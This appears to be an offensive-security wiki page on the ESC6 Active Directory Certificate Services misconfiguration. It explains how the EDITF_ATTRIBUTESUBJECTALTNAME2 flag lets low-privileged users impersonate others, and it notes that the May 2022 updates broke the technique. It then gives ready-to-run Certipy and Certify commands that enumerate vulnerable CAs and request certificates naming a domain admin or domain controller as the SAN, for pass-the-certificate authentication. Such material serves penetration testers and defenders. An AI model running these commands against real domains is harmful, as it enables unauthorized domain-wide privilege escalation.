# CA configuration

## Theory

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_) found a domain escalation vector based on a dangerous CA setting (i.e. the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag). The escalation vector was dubbed [ESC6](https://posts.specterops.io/certified-pre-owned-d95910965cd2#2a56).

When the flag is set on the CA, templates configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (`OID 2.5.29.37.0`), or no EKU (`SubCA`)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.

{% hint style="success" %}
The default **User** template checks all the template requirements stated above.&#x20;

If the CA is configured with the  `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins tend to enable that flag without knowing the security implications), and the **User** template is enabled (which is very often), any user can escalate to domain admin.
{% endhint %}

{% hint style="danger" %}
[May 2022 security updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) broke ESC6.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate info about the CAs, including the "**User Specified SAN**" flag state which is an alias to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep "User Specified SAN"
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}

Once the right template is found (i.e. the default User template) ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

<pre class="language-bash"><code class="lang-bash"><strong>#To specify a user account in the SAN
</strong><strong>certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
</strong><strong>
</strong><strong>#To specify a computer account in the SAN
</strong>certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
</code></pre>

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including the "**UserSpecifiedSAN**" flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

```batch
Certify.exe cas
```

If the flag is enabled on a CA, certify can then be used to find all enabled templates configured with EKUs allowing for authentication, and allowing low-priv users to enroll.

```batch
Certify.exe /enrolleeSuppliesSubject
Certify.exe /clientauth
```

Once the right template is found (i.e. the default **User** template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

```batch
Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans" %}

{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}
